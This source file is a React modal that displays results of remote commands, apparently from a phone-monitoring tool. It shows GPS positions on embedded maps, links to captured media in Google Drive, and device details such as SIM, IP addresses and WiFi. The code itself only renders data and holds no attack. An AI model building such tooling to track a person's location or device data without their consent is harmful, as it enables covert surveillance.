'use client';

import React from 'react';

interface TelemetryModalProps {
  selectedOutput: string;
  history: any[];
  onClose: () => void;
  onDeleteData: (commandName?: string) => void;
}

export default function TelemetryModal({ selectedOutput, history, onClose, onDeleteData }: TelemetryModalProps) {
  const matchingEntries = history.filter(h => h.command === selectedOutput || h.command.startsWith(selectedOutput));
  if (matchingEntries.length === 0) return null;
  const res = matchingEntries[0];

  const renderTelemetryContent = (rawPayload: any) => {
    if (!rawPayload) return null;

    let payload = rawPayload;
    if (typeof payload === 'object' && payload.type === 'text' && typeof payload.content === 'string') {
      try {
        const parsed = JSON.parse(payload.content);
        payload = parsed;
      } catch {
        payload = payload.content;
      }
    }

    // Structured JSON Payload
    if (typeof payload === 'object') {
      if (payload.type === 'location') {
        const { lat, lon, provider, accuracy, battery, batteryLevel, speed, altitude } = payload;
        const googleEmbedUrl = `https://maps.google.com/maps?q=${lat},${lon}&t=&z=15&ie=UTF8&iwloc=&output=embed`;
        const battText = battery || (batteryLevel !== undefined ? `${batteryLevel}%` : null);

        return (
          <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem', width: '100%' }}>
            <div style={{ width: '100%', height: '300px', borderRadius: '12px', overflow: 'hidden', border: '1px solid var(--glass-border)', boxShadow: '0 4px 20px rgba(0,0,0,0.2)' }}>
              <iframe width="100%" height="100%" frameBorder="0" scrolling="no" src={googleEmbedUrl} style={{ border: 'none' }}></iframe>
            </div>
            <div style={{
              fontSize: '0.85rem',
              backgroundColor: 'var(--border-light)',
              padding: '0.85rem',
              borderRadius: '8px',
              display: 'grid',
              gridTemplateColumns: 'repeat(auto-fit, minmax(130px, 1fr))',
              gap: '8px',
              width: '100%'
            }}>
              <div style={{ wordBreak: 'break-all' }}><strong>Latitude:</strong> {lat}</div>
              <div style={{ wordBreak: 'break-all' }}><strong>Longitude:</strong> {lon}</div>
              <div><strong>Provider:</strong> {provider || 'GPS'}</div>
              {accuracy && <div><strong>Accuracy:</strong> {accuracy}</div>}
              {battText && <div><strong>Battery:</strong> {battText} 🔋</div>}
              {speed && <div><strong>Speed:</strong> {speed}</div>}
              {altitude && <div><strong>Altitude:</strong> {altitude}</div>}
            </div>
            <a href={`https://maps.google.com/?q=${lat},${lon}`} target="_blank" rel="noreferrer" className="btn btn-primary" style={{ textAlign: 'center', textDecoration: 'none', display: 'block', padding: '0.75rem', width: '100%' }}>
              Open in Google Maps ↗
            </a>
          </div>
        );
      }

      if (payload.type === 'media' || payload.url) {
        const url = payload.url || payload.content;
        return (
          <div style={{
            display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
            padding: '2rem 1rem', textAlign: 'center', backgroundColor: 'rgba(15, 157, 88, 0.1)',
            borderRadius: '12px', border: '1px solid rgba(15, 157, 88, 0.4)', width: '100%'
          }}>
            <div style={{ fontSize: '2.5rem', marginBottom: '0.75rem' }}>📁</div>
            <h3 style={{ fontSize: '1.1rem', marginBottom: '1rem', color: '#0f9d58' }}>Media Saved to Google Drive</h3>
            <a href={url} target="_blank" rel="noreferrer" className="btn btn-primary" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', width: '100%', maxWidth: '280px', margin: '0 auto', textDecoration: 'none', backgroundColor: '#0f9d58', color: '#fff', border: 'none' }}>
              <span>↗️</span> Open in Google Drive
            </a>
          </div>
        );
      }

      if (payload.type === 'stats') {
        const { device, os, battery, sim, ips, wifi } = payload;
        const items = [
          { icon: '📱', label: 'Device', value: device },
          { icon: '💻', label: 'OS', value: os },
          { icon: '🔋', label: 'Battery', value: battery ? `${battery}%` : 'N/A' },
          { icon: '📶', label: 'SIM', value: sim },
          { icon: '🌐', label: 'IPs', value: ips },
          { icon: '📡', label: 'WiFi', value: wifi },
        ].filter(item => item.value);

        return (
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.75rem', width: '100%' }}>
            {items.map((item, idx) => (
              <div key={idx} style={{ backgroundColor: 'var(--border-light)', padding: '0.85rem', borderRadius: '8px', border: '1px solid var(--glass-border)' }}>
                <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', textTransform: 'uppercase', marginBottom: '0.25rem' }}>
                  {item.icon} {item.label}
                </div>
                <div style={{ fontSize: '0.95rem', fontWeight: '500', wordBreak: 'break-word' }}>{item.value}</div>
              </div>
            ))}
          </div>
        );
      }

      return <pre style={{ whiteSpace: 'pre-wrap', lineHeight: '1.5', overflowX: 'auto', maxWidth: '100%' }}>{JSON.stringify(payload, null, 2)}</pre>;
    }

    const text = payload;
    let lat: number | null = null;
    let lon: number | null = null;

    const mapsMatch = text.match(/https?:\/\/[^\s]*[\?&](?:q|ll|query)=(-?\d+(?:\.\d+)?),(-?\d+(?:\.\d+)?)/i);
    if (mapsMatch) {
      lat = parseFloat(mapsMatch[1]);
      lon = parseFloat(mapsMatch[2]);
    }

    if (!lat || !lon) {
      const latMatch = text.match(/Lat(?:itude)?:\s*(-?\d+(?:\.\d+)?)/i);
      const lonMatch = text.match(/Lon(?:gitude)?:\s*(-?\d+(?:\.\d+)?)/i);
      if (latMatch && lonMatch) {
        lat = parseFloat(latMatch[1]);
        lon = parseFloat(lonMatch[2]);
      }
    }

    if (lat && lon) {
      const googleEmbedUrl = `https://maps.google.com/maps?q=${lat},${lon}&t=&z=15&ie=UTF8&iwloc=&output=embed`;
      return (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem', width: '100%' }}>
          <div style={{ width: '100%', height: '300px', borderRadius: '12px', overflow: 'hidden', border: '1px solid var(--glass-border)', boxShadow: '0 4px 20px rgba(0,0,0,0.2)' }}>
            <iframe width="100%" height="100%" frameBorder="0" scrolling="no" src={googleEmbedUrl} style={{ border: 'none' }}></iframe>
          </div>
          <div style={{ fontSize: '0.85rem', backgroundColor: 'var(--border-light)', padding: '0.85rem', borderRadius: '8px', fontFamily: 'monospace', whiteSpace: 'pre-wrap', wordBreak: 'break-word', width: '100%' }}>
            {text}
          </div>
          <a href={`https://maps.google.com/?q=${lat},${lon}`} target="_blank" rel="noreferrer" className="btn btn-primary" style={{ textAlign: 'center', textDecoration: 'none', display: 'block', padding: '0.75rem', width: '100%' }}>
            Open in Google Maps ↗
          </a>
        </div>
      );
    }

    const isError = text.toLowerCase().includes('failed');
    if (isError) {
      return (
        <div style={{
          display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
          padding: '2rem 1rem', textAlign: 'center', backgroundColor: 'rgba(248, 81, 73, 0.1)',
          borderRadius: '12px', border: '1px solid rgba(248, 81, 73, 0.4)', width: '100%'
        }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '0.5rem' }}>❌</div>
          <h3 style={{ fontSize: '1.1rem', marginBottom: '0.5rem', color: 'var(--danger-color)' }}>Task Failed</h3>
          <p style={{ color: 'var(--text-secondary)', fontSize: '0.9rem', wordBreak: 'break-word' }}>{text}</p>
        </div>
      );
    }

    return <div style={{ whiteSpace: 'pre-wrap', lineHeight: '1.5', wordBreak: 'break-word', width: '100%' }}>{text}</div>;
  };

  return (
    <div style={{
      position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
      backgroundColor: 'rgba(0,0,0,0.75)', zIndex: 1000,
      display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '0.75rem'
    }} onClick={onClose}>
      <div className="glass-panel" style={{
        width: '100%', maxWidth: '750px', maxHeight: '92vh', overflowY: 'auto',
        padding: '1.5rem 1.25rem', position: 'relative', border: '1px solid var(--glass-border)',
        backgroundColor: '#161b22'
      }} onClick={e => e.stopPropagation()}>
        <button onClick={onClose} style={{
          position: 'absolute', top: '1rem', right: '1rem', background: 'none', border: 'none',
          color: 'var(--text-primary)', fontSize: '1.5rem', cursor: 'pointer', lineHeight: '1'
        }}>×</button>

        <h2 style={{ fontSize: '1.3rem', marginBottom: '0.5rem', textTransform: 'capitalize', display: 'flex', flexWrap: 'wrap', gap: '10px', alignItems: 'center', justifyContent: 'space-between' }}>
          <span>{selectedOutput} Output</span>
          <button onClick={() => onDeleteData(selectedOutput)} className="btn btn-danger" style={{ padding: '4px 10px', fontSize: '0.75rem', marginRight: '2rem' }}>
            Delete Entry
          </button>
        </h2>
        <div style={{ color: 'var(--text-secondary)', marginBottom: '1rem', fontSize: '0.85rem' }}>
          Received: {new Date(res.timestamp).toLocaleString()}
        </div>

        <div style={{
          backgroundColor: 'rgba(0,0,0,0.5)', padding: '1.25rem 1rem', borderRadius: '12px',
          border: '1px solid var(--border-light)', color: 'var(--text-primary)', width: '100%', overflowX: 'hidden'
        }}>
          {renderTelemetryContent(res.payload)}
        </div>
      </div>
    </div>
  );
}
